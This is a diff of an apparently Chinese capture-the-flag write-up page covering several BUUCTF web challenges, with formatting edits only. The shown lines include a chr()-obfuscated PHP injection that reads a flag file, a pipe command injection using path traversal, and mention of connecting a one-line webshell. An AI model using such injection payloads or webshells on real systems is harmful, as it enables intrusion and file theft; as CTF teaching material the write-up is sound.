@@ -91,14 +91,14 @@
 <p>读取f1agg文件，</p>
 <p><code>? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code></p>
 <p><img src="/2020/11/09/buuctf-web-1/image-20201110221327620.png" alt="image-20201110221327620"></p>
-<h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><h3 id><a href="#" class="headerlink" title></a></h3><p>payload：</p>
+<h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><p>payload：</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">123|cat <span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/flag</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/11/09/buuctf-web-1/image-20201111173214101.png" alt="image-20201111173214101"></p>
 <h1 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h1><p><img src="/2020/11/09/buuctf-web-1/image-20201112152241674.png" alt="image-20201112152241674"></p>
 <p>连接一句话马，</p>
 <p><img src="/2020/11/09/buuctf-web-1/image-20201112152304644.png" alt="image-20201112152304644"></p>
-<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>通过尝试，找到了<a href="http://www.zip备份目录，审计源码。" target="_blank" rel="noopener">www.zip备份目录，审计源码。</a></p>
+<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>通过尝试，找到了<code>www.zip</code>备份目录，审计源码。</p>
 <p>反序列化学习：<a href="https://www.jianshu.com/p/1d2c65601d2a" target="_blank" rel="noopener">https://www.jianshu.com/p/1d2c65601d2a</a></p>
 <p>输出flag的是class.php：</p>
 <p><img src="/2020/11/09/buuctf-web-1/image-20201113214722442.png" alt="image-20201113214722442"></p>
